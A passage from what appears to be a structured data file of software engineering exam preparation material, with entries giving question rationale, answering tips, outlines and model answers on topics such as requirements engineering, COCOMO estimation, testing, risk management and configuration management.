— record which versions are in each baseline and verify the build matches it.\nDraw: developer → repository → CI build → test → release baseline."},"se-11":{"u":4,"logic":"Tests the five named RE activities in order, plus the point that they are iterative. Students often jump from elicitation straight to an SRS and lose validation marks.","how":"Five headings: elicitation, analysis/negotiation, specification, validation, management. One line each, then say the process is iterative.","skel":["Define RE and its product, the SRS","Elicitation: interviews, observation, scenarios, documents","Analysis and negotiation: conflicts, priorities, scope","Specification: user vs system requirements","Validation: reviews, prototyping, test cases; management of change"],"ans":"Requirements engineering is the process of discovering, documenting and maintaining what the system must do and its constraints; its output is the software requirements specification (SRS).\n1. Elicitation — gather requirements from stakeholders, the domain and existing systems using interviews, questionnaires, observation, document analysis, scenarios and prototypes.\n2. Analysis and negotiation — classify requirements, detect conflicts, overlaps and gaps, and agree priorities and scope.\n3. Specification — write user requirements in natural language or use cases and system requirements in structured language, with measurable acceptance criteria.\n4. Validation — check validity, consistency, completeness, realism and verifiability by reviews, prototyping and test-case generation.\n5. Requirements management — control change through unique identifiers, traceability, baselines and impact analysis.\nThese activities overlap and iterate: a prototype in validation sends you back to elicitation. Draw them as a cycle."},"se-12":{"u":10,"logic":"Two unrelated short notes test breadth: whether you can plan a schedule with dependencies and whether you understand web/service-based software engineering.","how":"Two labelled halves, four to five lines each. For scheduling write the steps; for internet software write the characteristics.","skel":["Project scheduling: WBS to calendar, dependencies, critical path","Gantt chart and milestones; track planned vs actual","Internet software engineering: services, reuse, continuous deployment","Cloud, multi-tenant, browser client","New risks: security, third-party dependency, heterogeneity"],"ans":"Project scheduling — converting the WBS and effort estimates into a calendar. Steps: identify tasks and dependencies, estimate duration and resources, compute the critical path, allocate staff, set milestones, draw a Gantt chart, then track actual against planned progress and re-plan on slippage.\nInternet software engineering — building software as web-based services over the internet: service-oriented design with reuse of third-party APIs, incremental and continuous deployment, cloud hosting, multi-tenant operation, a browser client and constant availability. It gives faster delivery, easy scaling and global reach, but brings new risks: security and privacy exposure, dependence on external services, browser and device heterogeneity, and always-on operations."},"se-13":{"u":8,"logic":"A composite question: it checks the testing process, the development-versus-release distinction and TDD with a worked example. The example is where most candidates drop marks.","how":"Split into four labelled parts: definition, process steps, dev vs release, TDD red-green-refactor with one tiny example. Time-box the example.","skel":["Define testing: execute to find defects","Process: plan, design cases, prepare, execute, log, regress, report","Techniques: black-box and white-box named","Development testing by developers vs release testing by independent team","TDD: red, green, refactor with discount example"],"ans":"Software testing is the process of executing a program to find defects and to show that it meets its requirements.\nTesting process:\n1. Plan — objectives, levels, scope, schedule, exit criteria.\n2. Design test cases — black-box (equivalence partitioning, boundary value, decision table) and white-box (statement, branch, path coverage).\n3. Prepare data and environment, and automate where possible.\n4. Execute, compare actual with expected output, and log each defect with severity.\n5. Retest fixes and run regression after every change; measure coverage and report results.\nDevelopment vs release testing: development testing is done by developers on their own components (unit, integration, system) to find defects early; release testing is done by an independent team on the complete system, black-box against requirements, to decide whether it can be shipped.\nTDD improves quality through red-green-refactor: write a failing test first (red), write only enough code to pass (green), then refactor safely. Example: for discount(1000) expected 100, the assertion is written before the method exists; it fails, minimal code makes it pass, then it is cleaned up. The suite becomes an executable specification and a safety net, so design stays testable and defects fall."},"se-14":{"u":6,"logic":"Tests that architecture is a set of decisions with trade-offs, and that you can draw three classic patterns with structure, benefit and cost — not just name them.","how":"Five decisions first, then each pattern as 'structure + diagram + pro + con'. Draw three small boxes-and-arrows figures.","skel":["Decisions: style, distribution, platform, NFR priority, data, buy vs build","MVC: model, view, controller triangle with arrows","Client-server: clients, server, database","Pipe and filter: input through sequential filters","One pro and one con for each pattern"],"ans":"Architectural design decisions:\n• Architecture style — layered, client-server, MVC, pipe-filter or repository, chosen by quality attributes.\n• Distribution — centralised, client-server or multi-tier; where processing and data sit.\n• Technology platform — language, framework, database, cloud; buy versus build.\n• Non-functional priorities — the trade-off between performance, security, availability and modifiability, recorded explicitly.\n• Data storage and access — single central database versus replication, and consistency needs.\n• Documentation — record decisions, their rationale and the architectural views.\n(a) MVC — Model holds data and rules, View displays, Controller takes input and updates the model. Draw Model ↔ View with Controller between them. Pro: UI and logic change independently; con: extra indirection.\n(b) Client-server — clients request services, the server holds logic and data. Draw three client boxes → server → database. Pro: central data, security and control; con: server bottleneck, single point of failure, network dependence.\n(c) Pipe and filter — each filter transforms data passed along a pipe. Draw input → filter1 → filter2 → filter3 → output. Pro: filters are reusable and recombinable; con: poor for interactive use, conversion overhead."},"se-15":{"u":10,"logic":"Tests breadth of project management plus depth on risk: identification, analysis by probability × impact, planning responses and monitoring, all tied to one worked example.","how":"Definition, six activities, then the risk cycle with one running example. The example must show all four risk steps to score.","skel":["Define PM: plan, monitor, control to time/budget/quality","Activities: proposal, planning, risk, people, reporting, quality/CM","Risk: identify, analyse, plan, monitor","Example: SMS gateway delay in exam system","Responses: avoid, reduce, transfer, accept with contingency"],"ans":"Project management is the planning, monitoring and control of people, process and product so that software is delivered on time, within budget and at the required quality.\nActivities:\n• Proposal writing — scope, cost and schedule for a bid.\n• Project planning — WBS, estimates, schedule (Gantt, critical path), resources, quality and risk plans.\n• Risk management — identify, analyse, plan and monitor threats.\n• People management — selection, motivation, team structure, conflict resolution.\n• Reporting — progress against plan, reviews and metrics for management and customer.\n• Quality and configuration management — standards, reviews, version and release control.\nRisk management example (university exam system):\n1. Identification — the SMS gateway for result alerts may be delayed.\n2. Analysis — probability high, impact medium, so exposure is high; ranked in the risk register.\n3. Planning — avoid by email fallback, reduce by prototyping the API early, transfer through a vendor contract with penalty, accept with a two-week schedule buffer.\n4. Monitoring — owner assigned, trigger set (no sandbox access by week 3), reviewed weekly.\nDraw the cycle: identify → analyse → plan → monitor."},"se-16":{"u":4,"logic":"Tests knowledge of the elicitation toolbox and when each technique fits — the examiner wants technique plus what it is good for, not a bare list.","how":"Six techniques, each with a half-line on when to use it. Start with a one-line definition, end with a practical combination.","skel":["Define elicitation: discovering requirements from people and domain","Interviews and questionnaires: opinion at scale","Observation/ethnography: tacit workflow","Document analysis; focus groups and workshops","Scenarios, use cases, prototyping; record the source"],"ans":"Requirements elicitation is discovering requirements by communicating with stakeholders and studying the domain, the existing system and its documents.\n• Interviews — structured or unstructured talks with users and managers; good for opinion and context.\n• Questionnaires — reach many users cheaply; good for closed, comparable answers.\n• Observation and ethnography — watch real work, revealing informal workflow people never mention.\n• Document analysis — forms, manuals, reports and legacy code give rules and data.\n• Focus groups and workshops (JAD) — stakeholders negotiate together and conflicts surface early.\n• Scenarios and use cases — walk through a task to expose exceptions.\n• Prototyping — a mock-up makes users react to something concrete.\nPractically: interview and observe first, confirm with a prototype, and record each requirement with its source."},"se-17":{"u":10,"logic":"A pure computation question: it checks that you know the COCOMO formula, pick the right constants per mode, substitute correctly and interpret the result rather than stopping at numbers.","how":"Write formula, substitution and result on separate lines for both modes, then one comparison sentence. Never skip the substitution line — it carries method marks.","skel":["State formulas and constants for both modes","Organic: E = 2.4 × 320^1.05 ≈ 1025 PM","Organic: D = 2.5 × 1025^0.38 ≈ 35 months, team ≈ 30","Embedded: E = 3.6 × 320^1.20 ≈ 3652 PM","Embedded: D ≈ 34.5 months, team ≈ 106; compare effort"],"ans":"Basic COCOMO: E = a × (KLOC)^b person-months; D = c × E^d months; team = E/D. KLOC = 320.\n(a) Organic mode (a = 2.4, b = 1.05, c = 2.5, d = 0.38):\nE = 2.4 × (320)^1.05 = 2.4 × 426.98 ≈ 1025 PM\nD = 2.5 × (1025)^0.38 = 2.5 × 13.93 ≈ 34.8 ≈ 35 months\nTeam = 1025 ÷ 34.8 ≈ 30 people\n(b) Embedded mode (a = 3.6, b = 1.20, c = 2.5, d = 0.32):\nE = 3.6 × (320)^1.20 = 3.6 × 1014.33 ≈ 3652 PM\nD = 2.5 × (3652)^0.32 = 2.5 × 13.80 ≈ 34.5 months\nTeam = 3652 ÷ 34.5 ≈ 106 people\nEmbedded needs about 3.6 times the effort for the same size but almost the same duration, so the extra effort goes into a much larger team and higher coordination risk."},"se-18":{"u":2,"logic":"Tests whether you can separate build-from-scratch-in-increments from assemble-from-existing-components, and then justify the enterprise choice with reasons, not opinion.","how":"Two blocks of contrast, then a verdict sentence with three reasons. Name the reuse steps to prove you know the model.","skel":["Incremental: own code, prioritised slices, feedback each increment","I&C: assemble COTS/components, requirements modified to fit","I&C steps: requirements, component analysis, modification, design, integration","Contrast: control, cost, speed, requirement fit","Verdict: I&C for enterprise, incremental for custom logic"],"ans":"Incremental development builds the system in prioritised slices, each designed, coded and tested by the team, so users get working software early and change is absorbed in later increments; it needs a sound architecture and disciplined refactoring.\nIntegration and configuration assembles the system from existing components, frameworks, COTS packages and services, writing mainly glue code. Steps: requirements → component analysis → requirements modification → design with reuse → development and integration.\nContrast: incremental gives full control and exact fit but costs more and is slower; integration and configuration is faster, cheaper and uses proven components, but requirements are compromised and the vendor controls evolution.\nFor large enterprise systems, integration and configuration suits better: ERP, CRM, database and identity systems are already licensed, payroll and accounting are not worth building, and integration with existing systems matters more than bespoke features. Incremental development is then used only for the custom logic."},"se-19":{"u":5,"logic":"Tests diagram skills: can you fix a boundary with external entities and then derive actors and use cases from it. Assumptions must be stated or the diagram is unmarkable.","how":"State assumptions first, then draw the context diagram as one circle with boxes, then the use case diagram with four actors. Label every flow.","skel":["Assumptions: app ordering, eSewa/Khalti payment, freelance riders","Context: system circle plus six external entities with flows","Actors: customer, restaurant, rider, admin","Use cases per actor, with include Login","Extend case: apply coupon on place order"],"ans":"Assumptions: customers order from a mobile app; restaurants maintain their own menus; riders are freelancers; payment is by eSewa, Khalti or card; delivery is within one city.\nContext model — one circle 'Online Food Delivery System' surrounded by external entities, with labelled flows:\n• Customer ↔ order, payment, rating / menu, status, bill.\n• Restaurant ↔ menu updates, order acceptance / orders, payouts.\n• Rider ↔ availability, delivery status / assigned order, route.\n• Payment Gateway ↔ authorisation and confirmation.\n• Map/GPS Service ↔ route and ETA.\n• SMS/Email Service ← OTP and notifications.\nUse case diagram — Customer: browse menu, place order, pay online, track order, cancel, rate. Restaurant: manage menu, accept/reject order, mark ready. Rider: accept delivery, update status, mark delivered. Admin: manage users, resolve disputes, view reports. Show «include» Login on place order, pay and track; «extend» Apply coupon on place order."},"se-20":{"u":10,"logic":"Probes the QA-versus-QC distinction, which students routinely merge. The relationship — plan sets target, QA builds process, QC measures product — is the differentiator.","how":"Define QM, then three parts with one example each, then one sentence linking them as a feedback loop.","skel":["Define QM: processes ensuring quality attributes and standards","Quality planning: choose standards, metrics, attributes","QA: process-oriented, preventive, audits and standards","QC: product-oriented, detective, testing and inspection","Relationship: plan sets target, QA builds process, QC measures and feeds back"],"ans":"Software quality management is the set of processes ensuring the product meets its quality attributes — reliability, usability, security, performance, maintainability — and the agreed standards.\n• Quality planning — decide which attributes and standards apply and how they will be measured; recorded in the quality plan.\n• Quality assurance (QA) — process-oriented and preventive: define, train for and audit the process so defects are not introduced. Examples: coding standards, mandatory code review, ISO 9001 or CMMI audits.\n• Quality control (QC) — product-oriented and detective: test and inspect output, reject what fails. Examples: unit and system testing, inspections, defect tracking.\nRelationship: planning sets the target, QA builds the process meant to reach it, QC measures the actual product, and defects found in QC feed back to improve the process. Example: QA mandates review and automated tests; QC runs them and blocks the release when coverage fails."},"se-21":{"u":5,"logic":"A repeat of the MDA question with advantages and disadvantages added — the examiner wants the model chain plus a balanced judgement, so the second answer must be tighter.","how":"This repeats the earlier MDA question, so it is a sure shot. Write CIM-PIM-PSM, one line on modelling benefit, then two columns of pros and cons.","skel":["Define MDA: models primary, code generated by transformation","CIM, PIM, PSM with transformation arrows","How it helps: validate and port one model to many platforms","Advantages: portability, productivity, consistency","Disadvantages: lock-in, leakage, debugging, overkill"],"ans":"MDA is a development approach where models are the primary artefact and code, schemas and configuration are generated by automated transformation.\nLevels: CIM (business view, no computation), PIM (platform-independent UML model), PSM (the PIM mapped to a platform such as Java/Spring or .NET), then code.\nHow it helps modelling: the PIM is built and validated once without platform detail, so it can be simulated, checked for consistency and mapped to several targets; code is regenerated, so models and code cannot drift apart.\nAdvantages: portability, productivity through generated boilerplate, consistency across layers, design documented as models, easier migration and integration.\nDisadvantages: dependence on tools and standards, transformation output hard to debug, platform assumptions leak into the model, steep learning curve, and unnecessary overhead for small projects."},"se-22":{"u":7,"logic":"A structured repeat of the implementation-issues question: it demands three specific issues discussed by name, each with why it is a problem and how it is handled.","how":"Repeats the earlier implementation-issues question, so it is a sure shot. Three headings, each with issue then handle, and one closing line.","skel":["Define implementation issues as non-coding problems","Reuse: mismatch, licence, evolution — evaluate and wrap","Configuration management: versions, parallel change — repo, CI, baselines","Host-target: different platforms — cross-compiler, emulator, containers","Plan early; retrofitting costs more"],"ans":"Implementation issues are the largely non-coding problems met while turning a design into a running system; they often cost more than coding.\n• Reuse — assembling from libraries, frameworks or COTS. Issues: the component rarely fits exactly, licence terms, unknown quality, no control over its evolution. Handle: evaluate first, wrap it behind your own interface, pin versions, keep a replacement path.\n• Configuration management — parallel changes cause lost updates, wrong versions and unreproducible builds. Handle: one repository with a branching policy, baselines, automated CI builds, tagged releases and change control.\n• Host-target development — code is written on a host (laptop, IDE) but runs on a different target (Android device, embedded controller, server). Handle: cross-compilers, emulators, identical container images, staged environments and install scripts.\nPlan all three early; retrofitting version control or parity testing costs far more later."},"se-23":{"u":9,"logic":"Tests the four maintenance categories with their drivers and the widely examined fact that perfective maintenance dominates — with a reason, not just a percentage.","how":"Four bullets with a one-line example each, then a short defence of perfective as the largest share. Percentages are a bonus, the reason is the mark.","skel":["Corrective: fix reported defects, reactive","Adaptive: new environment, platform, regulation","Perfective: new features, performance, maintainability","Preventive: refactoring and library updates before failure","Perfective dominates because users keep requesting change"],"ans":"• Corrective (≈20%) — fixing defects found after delivery, such as a wrong VAT calculation or a crash on save.\n• Adaptive (≈25%) — adapting to a changed environment: new OS or browser, new tax rule, cloud migration, new payment gateway.\n• Perfective (≈50%) — improving the system: new features, faster queries, a better interface, refactoring for maintainability.\n• Preventive (≈5%) — reducing future deterioration: refactoring, updating libraries, adding tests before problems appear.\nPerfective maintenance consumes the most resources because a successful system generates continuous requests for new and changed functionality, and each change needs design, coding, regression testing and documentation; its share grows the longer the system stays in service. Corrective feels urgent but is a small slice; adaptive spikes only when platforms or regulations change."},"se-24":{"u":7,"logic":"Two short notes spanning implementation (open source, licensing) and management (agile PM) — checks breadth and that you can name licences and sprint artefacts.","how":"Two labelled halves of five lines. In the first, name GPL, MIT and Apache; in the second, list backlog, sprint, stand-up, review.","skel":["Open source: source published under licence, community development","Licences: GPL copyleft, MIT/BSD permissive, Apache","Pros: cost, auditability, reuse; cons: no warranty, licence risk","Agile PM: prioritised backlog, fixed-length sprints","Stand-up, burndown/velocity, review, retrospective"],"ans":"Open-source development — source code is published under a licence permitting use, modification and redistribution. Copyleft licences (GPL) force derivatives to stay open; permissive ones (MIT, BSD, Apache 2.0) allow closed derivatives. Development is community-based: public repositories, issue trackers, peer review, frequent releases, funding from volunteers or sponsoring companies. Advantages: low cost, no lock-in, auditability, fast bug fixing, reusable components. Disadvantages: no warranty or guaranteed support, licence-compliance risk, variable quality, forking. Example: Linux, MySQL and most libraries in Nepali web projects.\nAgile project management — managing by increments: a prioritised product backlog of user stories, fixed-length sprints of 2–4 weeks, sprint planning, a daily stand-up, velocity and burndown tracking, a sprint review with the customer, and a retrospective for process improvement. Time and team are fixed; scope flexes."},"se-25":{"u":10,"logic":"Tests pricing as a business decision tied to contract risk, then COCOMO as the costing engine, then a critical judgement of its limits — three skills in one question.","how":"Split: why pricing matters, COCOMO formula and modes, then five disadvantages. The disadvantages are easy marks most candidates forget.","skel":["Pricing sets profit, contract type and risk allocation","Factors: uncertainty, volatility, reputation, market rate","COCOMO: E = a(KLOC)^b, D = c(E)^d, three modes","Basic, intermediate with EAF, COCOMO II","Disadvantages: needs KLOC early, ignores volatility and skill"],"ans":"Software pricing is the process of deciding the price quoted to a customer. It is more than cost plus profit, because the price fixes the contract type and decides who carries the risk.\nImportance:\n• Determines profitability and whether the bid wins; an underpriced fixed-price bid can bankrupt the supplier.\n• Sets the contract: fixed price transfers estimation risk to the developer, cost-plus leaves it with the customer.\n• Drives scope, staffing and the contingency reserve.\n• Signals quality and reputation, and shapes cash flow through payment milestones.\nFactors: uncertainty of estimates, requirement volatility, contract terms, reputation, market rates.\nCOCOMO: E = a × (KLOC)^b person-months; D = c × E^d months. Basic COCOMO uses mode only — organic 2.4/1.05, semi-detached 3.0/1.12, embedded 3.6/1.20. Intermediate multiplies effort by an effort adjustment factor from 15 cost drivers; COCOMO II uses object points and scale factors. Cost = effort × labour rate + overhead.\nDisadvantages: needs a reliable KLOC before design exists, ignores requirement volatility and team skill, constants were calibrated on old projects, cost-driver ratings are subjective, and it models effort only, not total cost."},"se-26":{"u":5,"logic":"Tests three UML diagrams for one system consistently: can actors, classes and message order tell the same story, with stated assumptions and multiplicities.","how":"Assumptions, then three diagrams in order: use case, class with multiplicities, sequence. Draw, label arrows, and keep names identical across all three.","skel":["Assumptions: members rate books, engine recommends, admin manages catalogue","Use case: visitor, member, admin, engine","Class: User, Member, Book, Review, Order, Recommendation","Multiplicities: member 1-* order, order 1-* line, line *-1 book","Sequence: request, fetch ratings, compute, return list, display"],"ans":"Assumptions: visitors browse; members register, rate and buy books; recommendations are computed from ratings and purchase history; an admin maintains the catalogue; payment is by card.\nUse case diagram — actors: Visitor, Member, Admin, Recommendation Engine (secondary).\n• Visitor: search book, view details, register.\n• Member: login, rate/review book, view recommendations, add to wishlist, buy book.\n• Admin: add or update book, manage users, view sales report.\nShow «include» Login on rate, buy and view recommendations; «extend» Apply coupon on buy book.\nClass diagram — User (userId, name, email, password) is generalised by Member and Admin; Member 1—* Review (rating, comment); Review *—1 Book (ISBN, title, author, genre, price); Member 1—* Order, Order 1—* OrderLine, OrderLine *—1 Book; Recommendation (score, reason) links Member to Book.\nSequence diagram (get recommendations): Member → UI: viewRecommendations(); UI → RecommendationController: getRecommendations(memberId); Controller → RatingRepository: getRatings(memberId); Controller → RecommendationEngine: compute(ratings, catalogue); Engine → Controller: ranked Book list; Controller → UI: bookList; UI → Member: display list. Draw lifelines with time downwards."},"se-27":{"u":2,"logic":"Tests whether you can define a process model abstractly and then name the four fundamental activities that every process contains, with their sub-activities.","how":"Define model, then the four activities as headings with one line each, then supporting activities. Draw the four as a cycle with feedback.","skel":["Define process model: abstract representation of a process","Examples: waterfall, incremental, reuse-oriented, spiral","Specification: elicitation, analysis, SRS","Design and implementation; validation; evolution","Supporting: planning, risk, CM, quality; draw feedback cycle"],"ans":"A software process model is an abstract, simplified representation of a software process: it shows which activities occur, in what order, with what inputs and outputs, and where iteration happens. Examples are waterfall, incremental development, reuse-oriented development and the spiral model.\nAll processes contain four fundamental activities:\n1. Specification — defining what the system must do and its constraints: elicitation, analysis and negotiation, and writing the SRS.\n2. Design and implementation — architectural design, detailed component design, and coding the system.\n3. Validation — checking that the system meets its requirements: reviews, unit, integration, system and acceptance testing.\n4. Evolution — changing the system after delivery in response to new requirements, defects or environment change.\nSupporting activities: feasibility study, project planning, risk management, configuration management, quality assurance and documentation.\nIn practice the activities interleave and repeat; a model only decides how much of each happens per iteration. Draw the four as a cycle with feedback arrows between validation and specification."},"se-28":{"u":10,"logic":"A focused risk question: it wants the four-step cycle, a probability × impact analysis, the four response strategies and a concrete example of each stage.","how":"Repeats risk management from the project-management question, so it is a sure shot. Four numbered steps, one example running through them.","skel":["Define risk management: identify, assess, act before occurrence","Identification: checklists, register, risk types","Analysis: probability × impact matrix, exposure","Planning: avoid, reduce, transfer, accept with contingency","Monitoring: owner, trigger, weekly review"],"ans":"Risk management is the continuous process of identifying threats to schedule, budget, quality or the product, assessing them, and acting before they occur.\n1. Identification — checklists across technology, people, organisation, requirements, estimation and tools; record each risk in a register, e.g. 'two key developers may leave'.\n2. Analysis — rate probability and impact on a matrix, rank high/medium/low; exposure = probability × loss.\n3. Planning — avoid (drop the risky feature), reduce (cross-training, documentation, prototypes), transfer (insurance, vendor contract with penalty), accept with a contingency buffer.\n4. Monitoring — assign an owner, define triggers, review the register weekly.\nExample: the 'developers leave' risk is high/high — reduce by cross-training and design documents in the repository, accept with a 10% buffer, and trigger a review on any resignation."},"se-29":{"u":9,"logic":"An argumentative question: it wants cost and duration evidence plus a real example, not a definition. Candidates who only list maintenance types miss the 'justify' instruction.","how":"Four justification points (cost, duration, continuity, inevitability), then one detailed Nepali example. Write 'because' in each point.","skel":["Maintenance is ~60% of lifetime cost","Systems run far longer than they take to build","Live faults stop revenue and service","Change is inevitable: platform, tax, security","Example: IRD taxpayer portal changing with each budget"],"ans":"Maintenance is the most important lifecycle activity because software earns its value only while it runs, and running software always changes.\n• Cost: maintenance absorbs about 60% of lifecycle cost, so it decides whether the system is economic.\n• Duration: a system may serve ten to twenty years while taking one year to build; almost all engineering effort happens after delivery.\n• Continuity: a live defect stops business — a failed payment module halts sales, a crashed hospital record system halts treatment.\n• Inevitability: operating systems, browsers, tax rules and security patches change; without maintenance the software becomes a legacy liability.\nExample: the IRD taxpayer portal must change with every budget — new tax slabs, VAT rates and return forms — and with each browser and security update. Development happened once; the maintenance done every fiscal year is what keeps taxpayers compliant and the system usable."},"se-30":{"u":8,"logic":"Tests the verification/validation distinction with the two classic questions, then inspection as a static process with roles and stages — a pairing examiners like because the contrast is clean.","how":"Two-line contrast with both 'are we building...' questions, then the six inspection stages. The definitions alone are two easy marks.","skel":["Verification: building the product right, static, against spec","Validation: building the right product, dynamic, against need","Inspection: formal static team review with checklist","Roles: moderator, author, inspectors, recorder","Stages: plan, overview, prepare, meeting, rework, follow-up"],"ans":"Verification asks 'are we building the product right?' — it confirms that a work product conforms to its specification. It is static: reviews, inspections, walkthroughs.\nValidation asks 'are we building the right product?' — it confirms that the system meets the user's real need. It is dynamic: testing with real data, acceptance and beta testing.\nSo verification compares the artefact with the specification, while validation compares the product with the need; a system can be verified against a wrong specification.\nInspection is a formal, static, team review against a checklist:\n1. Planning — entry criteria, checklist, documents distributed.\n2. Overview — author briefs the team.\n3. Preparation — each inspector lists defects alone.\n4. Meeting — recorder logs defects; no solutions, author does not defend.\n5. Rework — author fixes them.\n6. Follow-up — moderator verifies and checks exit criteria.\nRoles: moderator, author, three or four inspectors, recorder."},"se-31":{"u":7,"logic":"Tests whether design patterns are understood as named reusable solutions with intent, and whether you can argue their role in OO design instead of listing names only.","how":"Definition, three groups with two patterns each and a real example, then three sentences on the role in OOD.","skel":["Define: named reusable solution to a recurring design problem","Creational: Singleton, Factory Method","Structural: Adapter, Facade, Composite","Behavioural: Observer, Strategy, Template Method","Role: vocabulary, reuse, modifiability; risk of overuse"],"ans":"A design pattern is a named, reusable solution to a recurring design problem in a given context — not code but a template of collaborating classes with trade-offs; the GoF catalogue has 23 in three groups.\n• Creational — Singleton (one instance, e.g. a connection pool), Factory Method (create without naming the class).\n• Structural — Adapter (convert an interface, e.g. wrapping a payment gateway), Facade (one interface over a subsystem), Composite (a tree of parts as one object).\n• Behavioural — Observer (views update when the model changes), Strategy (interchangeable algorithms such as discount policies), Template Method.\nRole in OOD: patterns give a shared vocabulary, reuse proven structures instead of inventing them, raise modifiability and reuse, support the open-closed principle, and document intent for new developers. Over-application adds needless classes and indirection."},"se-32":{"u":6,"logic":"Tests whether you know that architecture is applied per application type, and whether you can describe one application architecture with its layers and quality properties.","how":"Name the application type, draw three layers, then list properties with one line each. Transaction processing is the safest to write.","skel":["Application architecture organises an app for its task type","Chosen type: transaction processing, e.g. ticket booking","Layers: user interaction, transaction processing, database","Properties: ACID, concurrency control, recovery, high I/O","Example: seat reserved and paid in one atomic transaction"],"ans":"An application architecture organises an application into layers and components for its type of task — data processing, transaction processing, event processing or language processing. One application: transaction processing, as in ticket booking or banking.\nDraw three stacked layers:\n• User-interaction layer — forms, validation and session handling for many concurrent users.\n• Transaction-processing layer — request queue, a transaction manager issuing BEGIN, COMMIT and ROLLBACK, and the application logic; enforces ACID, locks rows and recovers from failure.\n• Database layer — the DBMS with recovery log, backups and integrity constraints.\nProperties: high input/output with short response, concurrency control, atomicity, integrity, and 24×7 availability with fast restart. Example: booking a Kathmandu–Pokhara seat — the seat is reserved and the payment recorded in one transaction; if payment fails, it rolls back and the seat is released."},"se-33":{"u":5,"logic":"Tests whether the student can separate static structure from run-time behaviour — most candidates define both but fail to say why the behavioural view earns its keep.","how":"Two definitions, one diagram each, then two lines on importance. Draw a class diagram beside a state machine of the same ticket.","skel":["Structural = static organisation; behavioural = dynamic response to events","Structural: class, component, deployment diagrams","Behavioural: state machine, activity, sequence diagrams","Importance: dead states, unhandled events, timing errors","Draw class diagram vs state machine for a ticket"],"ans":"A structural model describes the static organisation of a system — its components and how they connect — and says nothing about execution. A behavioural model describes what happens at run time: states, events, transitions and activity flow.\n• Structural: class, component and deployment diagrams — e.g. Bus, Ticket and Passenger with associations and multiplicity.\n• Behavioural: state machine, activity and sequence diagrams — e.g. a Ticket moving reserved → paid → cancelled.\nImportance: the behavioural model shows the order of interactions, so a designer can confirm every event is handled, find dead or unreachable states, and expose timing and concurrency errors a static view hides. Each transition also becomes a ready-made test case.\nDraw a class diagram beside a state machine for the same ticket."},"se-34":{"u":4,"logic":"Checks whether requirements engineering is known as a process with named activities, not as a single act of writing an SRS.","how":"Number the four activities plus management, one line each; name a technique per activity. A loop diagram earns a mark free.","skel":["Definition: discovering, documenting, maintaining what is required","Elicitation → analysis/negotiation → specification → validation","Add requirements management for change","One named technique per activity","Draw the loop over requirements management"],"ans":"Requirements engineering (RE) discovers, analyses, documents and maintains what a system must do and the constraints on it. It has four core activities, wrapped by management:\n1. Elicitation — collect needs via interviews, questionnaires, observation, document analysis and prototyping.\n2. Analysis and negotiation — classify, prioritise and resolve conflicting stakeholder demands; agree scope.\n3. Specification — write the agreed requirements as an SRS in structured language, use cases or models, each uniquely identified.\n4. Validation — confirm they are valid, complete, consistent, realistic and verifiable through reviews, prototypes and test cases.\n5. Management — control change with requests, impact analysis, traceability and baselining.\nDraw the four activities as a loop over management. Example: passenger interviews reveal the refund requirement that no document mentioned."},"se-35":{"u":3,"logic":"Probes whether agile is understood as principles plus concrete practices, rather than a vague slogan about flexibility.","how":"Two halves: five principles, then four techniques. Mnemonic — early delivery, welcome change, together daily, working software, sustainable pace.","skel":["Agile = values over documentation and rigid process","Principles: early delivery, welcome change, daily collaboration","Working software measures progress; simplicity, sustainable pace","Techniques: user stories, TDD, pair programming, CI","Scrum ceremonies and burndown chart"],"ans":"Agile development favours working software, customer collaboration, individuals and response to change over documentation and rigid process (Agile Manifesto, 2001).\nPrinciples:\n• Deliver working software early and continuously, in short cycles.\n• Welcome changing requirements, even late in development.\n• Business people and developers work together daily; face-to-face talk is best.\n• Working software is the primary measure of progress; simplicity — maximise the work not done.\n• Self-organising teams at a sustainable pace, reflecting and tuning regularly.\nTechniques:\n• User stories, story points and backlog prioritisation (MoSCoW).\n• Test-driven development — red, green, refactor — with continuous integration.\n• Pair programming, refactoring and small releases (XP practices).\n• Scrum: sprint planning, daily stand-up, sprint review, retrospective, tracked by a burndown chart."},"se-36":{"u":2,"logic":"A short-notes question with the topic list stripped from the paper; it rewards students who know three compact, high-frequency topics rather than one long one.","how":"Learn CMMI levels, the three design-pattern families and the four CM activities — those cover almost every short-note variant.","skel":["The paper prints topics after the colon — answer those","CMMI: five maturity levels, initial to optimizing","Design patterns: creational, structural, behavioural, with examples","Configuration management: version control, baselines, change control"],"ans":"(The paper prints the topics after the colon; the three most repeated are answered — use the ones actually printed.)\n(a) CMMI — Capability Maturity Model Integration, a process-improvement framework rating an organisation on five levels: 1 Initial (ad hoc), 2 Managed (project-level planning), 3 Defined (organisation-wide standard process), 4 Quantitatively Managed (measured), 5 Optimizing (continuous improvement). Used to appraise maturity and plan improvement; often paired with ISO 9001.\n(b) Design patterns — reusable solution templates for recurring design problems. Creational: Singleton, Factory, Builder. Structural: Adapter, Facade, Decorator. Behavioural: Observer, Strategy, Command. Remember each as intent plus one example — Observer is a fare display refreshing when the price model changes.\n(c) Configuration management — identifying configuration items, version control, baselines, change control board, build and release management (Git, Jenkins)."},"se-37":{"u":10,"logic":"Group A favourite: it tests whether SCM is seen as a lifecycle-wide discipline rather than a version-control tool, and whether the student can justify it with an example.","how":"Definition, then requirement, design, code, test, release in order — one line each — and close with the fare-change example.","skel":["SCM = identify, control, track all configuration items","Four activities plus build and release","Requirements and design: versioned, baselined, CCB approved","Code and tests: branches, traceability, reproducible builds","Example: fare change released as v2.1, rollback kept"],"ans":"Software configuration management (SCM) identifies, controls and tracks every item that makes up a product — code, documents, test data, build scripts — so change is deliberate, traceable and reversible. Activities — identification, version control, change control, status reporting and release — run in every phase:\n• Requirements: each requirement and SRS draft is a versioned configuration item; changes pass through a change request and the change control board (CCB).\n• Design: UML models are baselined; a design change is impact-analysed through a traceability matrix before approval.\n• Implementation: work is done on Git branches, so two programmers cannot silently overwrite each other.\n• Testing: test cases are versioned with the code, so a failure is reproducible against the exact build.\n• Release and maintenance: numbered baselines allow rollback and trace a defect to the shipped version.\nExample: the bus fare changes — a request is raised, the CCB approves, requirement, design and tests are updated together and released as v2.1 while v2.0 stays for rollback.\nDraw: request → impact analysis → CCB → implement → test → new baseline."},"se-38":{"u":4,"logic":"Combines process knowledge with document quality; examiners want named activities plus testable SRS properties, and most students describe only elicitation.","how":"Five activities as numbered lines, then five SRS characteristics. Anchor each vague adjective to a bus-ticketing sentence.","skel":["Elicitation, analysis and negotiation, specification, validation, management","Name one technique per activity","SRS: complete, consistent, unambiguous, verifiable, traceable","Example rewritten from vague to measurable","Draw the four-activity loop"],"ans":"Requirements engineering has four core activities plus management:\n1. Elicitation — gather needs through interviews, observation, questionnaires, document analysis and prototyping.\n2. Analysis and 